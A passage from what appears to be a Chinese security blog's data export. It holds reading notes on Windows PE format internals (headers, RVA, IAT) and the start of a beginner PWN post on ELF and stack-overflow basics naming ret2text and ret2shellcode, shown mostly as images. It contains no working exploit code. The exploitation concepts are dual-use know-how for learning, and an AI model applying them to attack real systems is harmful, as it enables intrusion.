class=\"headerlink\" title=\"第十章 函数调用约定\"></a>第十章 函数调用约定</h1><h2 id=\"10-1-函数调用约定\"><a href=\"#10-1-函数调用约定\" class=\"headerlink\" title=\"10.1 函数调用约定\"></a>10.1 函数调用约定</h2><p>主要有以下几种函数调用约定</p>\n<ol>\n<li>cdecl</li>\n<li>stdcall</li>\n<li>fastcall</li>\n</ol>\n<p>main中调用printf</p>\n<p>则main为调用者，printf为被调用者</p>\n<h3 id=\"cdecl\"><a href=\"#cdecl\" class=\"headerlink\" title=\"cdecl\"></a>cdecl</h3><p>调用者清理栈中的参数，这种叫做cdecl。</p>\n<p>具体表现为就是esp加一定的数值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add esp,8</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>可以向被调用的函数传递长度可变的参数。</p>\n</blockquote>\n<h3 id=\"stdcall\"><a href=\"#stdcall\" class=\"headerlink\" title=\"stdcall\"></a>stdcall</h3><p>该方式主要是被调用者清理栈，c语言默认为cdecl。若要用此种方法，则要使用stdcall来编译</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&quot;stdio.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">int _stdcall add(int a,int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn(a+b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>具体表现为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">retn 8</span><br><span class=\"line\">retn+pop 8</span><br></pre></td></tr></table></figure>\n<h3 id=\"fastcall\"><a href=\"#fastcall\" class=\"headerlink\" title=\"fastcall\"></a>fastcall</h3><p>该方式与stdcall方式类似，但这种通常会用寄存器去传递那些需要传递给函数的部分参数。</p>\n<p>举个例子，若一个函数有4个参数，那么前两个参数会使用ecx和edx来传递</p>\n<p>此种方式调用较快，但由于需要用到寄存器。所以需要先备份寄存器里的内容。</p>\n<h1 id=\"第十三章-PE文件格式\"><a href=\"#第十三章-PE文件格式\" class=\"headerlink\" title=\"第十三章 PE文件格式\"></a>第十三章 PE文件格式</h1><h2 id=\"13-1-介绍\"><a href=\"#13-1-介绍\" class=\"headerlink\" title=\"13.1 介绍\"></a>13.1 介绍</h2><p>PE文件是windows操作系统下使用的可执行文件格式</p>\n<p>PE文件是指可执行的32位文件。64位可执行文件称为PE+或PE32+，是PE文件的一种扩展形式</p>\n<h2 id=\"13-2-PE文件格式\"><a href=\"#13-2-PE文件格式\" class=\"headerlink\" title=\"13.2 PE文件格式\"></a>13.2 PE文件格式</h2><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310153153376.png\" alt=\"image-20210310153153376\"></p>\n<p>跟随书上一起分析</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310153813415.png\" alt=\"image-20210310153813415\"></p>\n<h3 id=\"1-基本结构\"><a href=\"#1-基本结构\" class=\"headerlink\" title=\"1.基本结构\"></a>1.基本结构</h3><p>PE头：从DOS头到节区头</p>\n<p>PE体：余下部分</p>\n<p>文件中使用偏移，内存中使用虚拟地址来表示位置。</p>\n<p>文件内容一般有代码、数据、资源（.rsrc）节</p>\n<p>各节区头定义了各节区在文件或内存中的大小、位置、属性等。</p>\n<p><strong>这里有一个很重要的概念:最小基本单位。为了使文件/内存中各节区的位置处于最小单位的倍数位置上，我们通常会在其中添加NULL来补充</strong></p>\n<p>如图所示</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310154744199.png\" alt=\"image-20210310154744199\"></p>\n<h3 id=\"2-VA-amp-RVA\"><a href=\"#2-VA-amp-RVA\" class=\"headerlink\" title=\"2.VA&amp;RVA\"></a>2.VA&amp;RVA</h3><p>VA：进程虚拟内存的绝对地址</p>\n<p>RVA：从某个基准位置开始的相对地址</p>\n<p>为什么要VA和RVA呢？</p>\n<p>如果一个文件加载了多个dll文件，其VA是相同的，那么就会造成覆盖，导致程序加载不正常。</p>\n<p>使用RVA，只要基址是恰当的，那么最终加载出来的程序也是可以正常运行的。</p>\n<blockquote>\n<p>base+RVA=VA</p>\n</blockquote>\n<h2 id=\"13-3-PE头\"><a href=\"#13-3-PE头\" class=\"headerlink\" title=\"13.3 PE头\"></a>13.3 PE头</h2><p>PE头有许多结构体，这里一一说一下</p>\n<h3 id=\"1-DOS头\"><a href=\"#1-DOS头\" class=\"headerlink\" title=\"1.DOS头\"></a>1.DOS头</h3><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310160306566.png\" alt=\"image-20210310160306566\"></p>\n<blockquote>\n<p>e_magic:DOS签名（4D5A）</p>\n<p>e_lfanew:NT头的偏移</p>\n</blockquote>\n<p>我们看一下notepad的</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310160550894.png\" alt=\"image-20210310160550894\"></p>\n<p>这里e_lfanew是：000000E0</p>\n<blockquote>\n<p>Intel的CPU逆序存储，小端存储</p>\n</blockquote>\n<h3 id=\"2-DOS存根\"><a href=\"#2-DOS存根\" class=\"headerlink\" title=\"2.DOS存根\"></a>2.DOS存根</h3><p>DOS存根位于DOS头下方，且大小不固定</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161059662.png\" alt=\"image-20210310161059662\"></p>\n<p>图中红线为汇编代码</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161449879.png\" alt=\"image-20210310161449879\"></p>\n<p>意思也很简单，屏幕上写出一串字符串，然后退出。</p>\n<h3 id=\"3-NT头\"><a href=\"#3-NT头\" class=\"headerlink\" title=\"3.NT头\"></a>3.NT头</h3><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161601066.png\" alt=\"image-20210310161601066\"></p>\n<blockquote>\n<p>4字节的签名</p>\n<p>文件头</p>\n<p>可选头</p>\n</blockquote>\n<p>notepad如下</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161746973.png\" alt=\"image-20210310161746973\"></p>\n<h3 id=\"4-NT头：文件头\"><a href=\"#4-NT头：文件头\" class=\"headerlink\" title=\"4.NT头：文件头\"></a>4.NT头：文件头</h3><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161849517.png\" alt=\"image-20210310161849517\"></p>\n<blockquote>\n<p>以下四种如果设置不正确，将无法启动</p>\n<p>1.Machine码</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310162003248.png\" alt=\"image-20210310162003248\"></p>\n<p>2.NumberOfSections</p>\n<p>如其名，节区数量。定义节区数应与实际节区数对应</p>\n<p>3.SizeOfOptionalHeader</p>\n<p>可选节区头的大小，windows的PE文件通过查看该值来确定可选节区头的大小</p>\n<p>4.Characteristics</p>\n<p>该字段标识文件的属性、文件是否可运行、是否为dll文件等</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310162608891.png\" alt=\"image-20210310162608891\"></p>\n</blockquote>\n<p>notepad的文件头</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310162827298.png\" alt=\"image-20210310162827298\"></p>\n<blockquote>\n<p>014C:machine码 intel 386</p>\n<p>0003:节区数</p>\n<p>黄色是时间:48025287</p>\n<p>00000000:offset to symbol table</p>\n<p>00000000:number of symbols</p>\n<p>00E0：可选头的大小</p>\n<p>010F:Characteristics</p>\n</blockquote>\n<h3 id=\"5-可选头\"><a href=\"#5-可选头\" class=\"headerlink\" title=\"5.可选头\"></a>5.可选头</h3><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310163334695.png\" alt=\"image-20210310163334695\"></p>\n<blockquote>\n<p>以下几种也是非常重要的</p>\n<p>1.Magic</p>\n<p>32是10B 64是20B</p>\n<p>2.AddressOfEntryPoint</p>\n<p>RVA值，指出程序最先执行代码的起始地址</p>\n<p>3.ImageBase</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310163616650.png\" alt=\"image-20210310163616650\"></p>\n<p>4.SectionAlignment、FileAlignment</p>\n<p>SectionAlignment定义节区在内存中最小单位、FileAlignment定义节区在磁盘中最小单位。</p>\n<p>文件在磁盘和内存中大小必为这两个的整数倍</p>\n<p>5.SizeOfImage</p>\n<p>PE文件加载到内存时，该值定义了PE Image在虚拟内存中所占空间的大小</p>\n<p>6.SizeOfHeaders</p>\n<p>用来指出整个PE头的大小。该值为FileAlignment的整数倍</p>\n<p>第一节区所在位置与SizeOfHeaders距文件开始偏移量相同</p>\n<p>7.Subsystem</p>\n<p>看是什么文件</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310164312289.png\" alt=\"image-20210310164312289\"></p>\n<p>8.NumberOfRvaAndSizes</p>\n<p>用来定义最后一个元素的大小，虽说已经定义16，但也有可能不是16</p>\n<p>9.DataDirectory</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310164618863.png\" alt=\"image-20210310164618863\"></p>\n<p>主要关注以下4个</p>\n</blockquote>\n<p>notepad的可选头</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310164805130.png\" alt=\"image-20210310164805130\"></p>\n<blockquote>\n<p>1.magic:010B</p>\n<p>2.AddressOfEntryPoint：00739D</p>\n<p>3.ImageBase:01000000</p>\n<p>4.SectionAlignment、FileAlignment:00001000 0000200 </p>\n<p>6.SizeOfHeaders:00000400</p>\n</blockquote>\n<h3 id=\"6-节区头\"><a href=\"#6-节区头\" class=\"headerlink\" title=\"6.节区头\"></a>6.节区头</h3><p>节区头定义了节区的属性，不同节区有着不同的节区头。</p>\n<p>各个区权限如下</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310170851347.png\" alt=\"image-20210310170851347\"></p>\n<p>节区头</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310170937074.png\" alt=\"image-20210310170937074\"></p>\n<p>VitrtualAddress和PointerToRawData不带任何值，分别由SectionAlignment、FileAlignment确定</p>\n<p>VirtualSize和SizeOfRawData是不同的值，即加载大小是不同的。</p>\n<p>Name字段是随意的，想放什么放什么。</p>\n<p>notepad的节区头</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310171432320.png\" alt=\"image-20210310171432320\"></p>\n<blockquote>\n<p>Name:2E746578 .text</p>\n<p>PhysicalAddress:74000000</p>\n<p>内存</p>\n<p>VirtualSize 00007748</p>\n<p>VirtualAddress:00001000</p>\n<p>磁盘</p>\n<p>SizeOfRawData:00007800</p>\n<p>PointerToRawData:00000400</p>\n</blockquote>\n<h2 id=\"13-4-RVAtoRAW\"><a href=\"#13-4-RVAtoRAW\" class=\"headerlink\" title=\"13.4 RVAtoRAW\"></a>13.4 RVAtoRAW</h2><p>这里主要是讲一下从磁盘到内存映射的内容</p>\n<p>PE文件加载到内存时，每个节区都要准确地完成内存地址与文件偏移间的映射</p>\n<ol>\n<li>查找RVA所在节区</li>\n<li>计算文件偏移</li>\n</ol>\n<p>RAW=RVA-VirtualAddress+PointerToRawData</p>\n<blockquote>\n<p>RAW:相对文件偏移</p>\n<p>RVA：相对内存偏移</p>\n<p>VirtualAddress：内存中节区起始地址</p>\n<p>PointerToRawData：磁盘中节区起始地址</p>\n</blockquote>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310211021165.png\" alt=\"image-20210310211021165\"></p>\n<h2 id=\"13-5-IAT\"><a href=\"#13-5-IAT\" class=\"headerlink\" title=\"13.5 IAT\"></a>13.5 IAT</h2><p>IAT（Import Address Table）导入地址表</p>\n<p>EAT（Export Address Table）导出地址表</p>\n<h3 id=\"1-dll\"><a href=\"#1-dll\" class=\"headerlink\" title=\"1.dll\"></a>1.dll</h3><p>dll（Dynamic Link Library）</p>\n<ol>\n<li>不需要把库包含到程序中，单独组成dll文件，需要时调用即可</li>\n<li>内存映射技术使加载后的dll代码和资源在多个进程中共享</li>\n<li>更新库时，只需要更新相关的dll文件即可</li>\n</ol>\n<p>显式链接：程序使用dll时加载，使用完毕后释放内存。</p>\n<p>隐式链接：程序开始时就加载，程序终止时才释放内存</p>\n<h3 id=\"2-IMAGE-IMPORT-DESCRIPTOR\"><a href=\"#2-IMAGE-IMPORT-DESCRIPTOR\" class=\"headerlink\" title=\"2.IMAGE_IMPORT_DESCRIPTOR\"></a>2.IMAGE_IMPORT_DESCRIPTOR</h3><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310201607756.png\" alt=\"image-20210310201607756\"></p>\n<p>导入多少库就有多少种这样的结构体，这些结构体形成了数组，且结构体数组最后以NULL结构体结束</p>\n<p>主要看下面三个成员</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310201721746.png\" alt=\"image-20210310201721746\"></p>\n<p>这里说一下INT中各元素的值为IMAGE_IMPORT_BY_NAME结构体指针</p>\n<p>我们看一下下面这张图就一目了然了</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310202126351.png\" alt=\"image-20210310202126351\"></p>\n<p>PE装载器的顺序：</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310202304928.png\" alt=\"image-20210310202304928\"></p>\n<h3 id=\"3-练习\"><a href=\"#3-练习\" class=\"headerlink\" title=\"3.练习\"></a>3.练习</h3><p>IMAGE_IMPORT_DESCRIPTOR在哪里？</p>\n<p>我们还记得前面说过可选头里面有DataDirectory吗？这里面第二个成员就是IMPORT DIRECTORY</p>\n<p>IMAGE_OPTIONAL_HEADER32.DataDirectory[1]:第一个4字节为虚拟地址，第二个四字节为size</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310203430738.png\" alt=\"image-20210310203430738\"></p>\n<p>这样我们算出在文件中的偏移：</p>\n<p>7604-1000+400=6A04</p>\n<p>我们来看一下文件中偏移</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204231228.png\" alt=\"image-20210310204231228\"></p>\n<p>就是下图</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204430191.png\" alt=\"image-20210310204430191\"></p>\n<p>接下来就是一个一个看了</p>\n<p>1.Name</p>\n<p>Name是字符串指针，指向导入函数所属库的文件名称。</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204717043.png\" alt=\"image-20210310204717043\"></p>\n<p><strong>2.INT</strong></p>\n<p>INT是一个包含导入函数信息的结构体指针数组。</p>\n<p>只有这些信息才能在加载到进程内存的库中准确求得相应函数的起始地址。</p>\n<p>INT由地址数组形式组成，每个地址值分别指向IMAGE_IMPORT_BY_NAME结构体</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204835996.png\" alt=\"image-20210310204835996\"></p>\n<p><strong>3.IMAGE_IMPORT_BY_NAMEIMAGE_IMPORT_BY_NAME</strong></p>\n<p>7A7A——&gt;6E7A</p>\n<p>前面000F是Ordinal，是库中函数固有编号。</p>\n<p>后面就是字符串</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310205557622.png\" alt=\"image-20210310205557622\"></p>\n<p><strong>4.IAT</strong></p>\n<p>IAT同样也是由结构体指针数组组成，且以NULL结尾。</p>\n<p>IAT第一个元素为76344906，这里notepad在加载到内存中会的替换该值。</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310205918229.png\" alt=\"image-20210310205918229\"></p>\n<p>但由于该dll文件ImageBase就是10000000，所以76344906就是该函数的地址</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310210426731.png\" alt=\"image-20210310210426731\"></p>\n","categories":["逆向"],"tags":["book"]},{"title":"PWN学习","url":"https://pz1o.top/2020/10/24/PWN学习/","content":"<a id=\"more\"></a>\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><p>纯零基础，大佬请略过</p>\n<p>从零开始学习PWN,Web会去学，但可能现在大部分时间会用在PWN上，如果需要题的话可以评论</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg\" alt=\"1603543652982\"></p>\n<p>大学中是研究深度还是广度，我可能还是需要选择一下</p>\n<p>基本全是ppt截图</p>\n<h1 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h1><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201024233545234.png\" alt=\"image-20201024233545234\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -S a.c #生成汇编文件</span><br><span class=\"line\">file a.s #查看文件类型  可以看见是ascii文本</span><br><span class=\"line\">gcc a.s  #生成可执行文件</span><br><span class=\"line\">file a.out #可以看见是可执行文件</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230103100.png\" alt=\"image-20201027230103100\"></p>\n<h2 id=\"ELF文件\"><a href=\"#ELF文件\" class=\"headerlink\" title=\"ELF文件\"></a>ELF文件</h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230424200.png\" alt=\"image-20201027230424200\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164523021.png\" alt=\"image-20201028164523021\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164758641.png\" alt=\"image-20201028164758641\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028165455072.png\" alt=\"image-20201028165455072\"></p>\n<h2 id=\"虚拟内存\"><a href=\"#虚拟内存\" class=\"headerlink\" title=\"虚拟内存\"></a>虚拟内存</h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028170244054.png\" alt=\"image-20201028170244054\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028171316681.png\" alt=\"image-20201028171316681\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175015154.png\" alt=\"image-20201028175015154\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175324930.png\" alt=\"image-20201028175324930\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175515114.png\" alt=\"image-20201028175515114\"></p>\n<h2 id=\"程序编译与链接\"><a href=\"#程序编译与链接\" class=\"headerlink\" title=\"程序编译与链接\"></a>程序编译与链接</h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180055683.png\" alt=\"image-20201028180055683\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180509024.png\" alt=\"image-20201028180509024\"></p>\n<h2 id=\"程序装载与进程执行\"><a href=\"#程序装载与进程执行\" class=\"headerlink\" title=\"程序装载与进程执行\"></a>程序装载与进程执行</h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028181509843.png\" alt=\"image-20201028181509843\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182158445.png\" alt=\"image-20201028182158445\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182509458.png\" alt=\"image-20201028182509458\"></p>\n<h2 id=\"汇编指令\"><a href=\"#汇编指令\" class=\"headerlink\" title=\"汇编指令\"></a>汇编指令</h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182719496.png\" alt=\"image-20201028182719496\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183231684.png\" alt=\"image-20201028183231684\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183244082.png\" alt=\"image-20201028183244082\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183715008.png\" alt=\"image-20201028183715008\"></p>\n<h1 id=\"栈溢出基础\"><a href=\"#栈溢出基础\" class=\"headerlink\" title=\"栈溢出基础\"></a>栈溢出基础</h1><h2 id=\"基本原理\"><a href=\"#基本原理\" class=\"headerlink\" title=\"基本原理\"></a><strong>基本原理</strong></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210304426.png\" alt=\"image-20201028210304426\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210843823.png\" alt=\"image-20201028210843823\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212002026.png\" alt=\"image-20201028212002026\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212037049.png\" alt=\"image-20201028212037049\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212448211.png\" alt=\"image-20201028212448211\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212603675.png\" alt=\"image-20201028212603675\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213307651.png\" alt=\"image-20201028213307651\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213458423.png\" alt=\"image-20201028213458423\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213648493.png\" alt=\"image-20201028213648493\"></p>\n<h2 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a><strong>实例</strong></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213849813.png\" alt=\"image-20201028213849813\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215303342.png\" alt=\"image-20201028215303342\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029211445528.png\" alt=\"image-20201029211445528\"></p>\n<h2 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a><strong>攻击</strong></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215837467.png\" alt=\"image-20201028215837467\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028220533860.png\" alt=\"image-20201028220533860\"></p>\n<h3 id=\"ret2text\"><a href=\"#ret2text\" class=\"headerlink\" title=\"ret2text\"></a>ret2text</h3><p>返回地址为后门地址</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029210250310.png\" alt=\"image-20201029210250310\"></p>\n<h3 id=\"ret2shellcode\"><a href=\"#ret2shellcode\" class=\"headerlink\" title=\"ret2shellcode\"></a>ret2shellcode</h3><p>返回地址为写入的shellcode的地址</p>\n<p><strong>栈中写入shellcode</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103230658840.png\" alt=\"image-20201103230658840\"></p>\n<p><strong>bss段写入shellcode</strong></p>\n<p><img 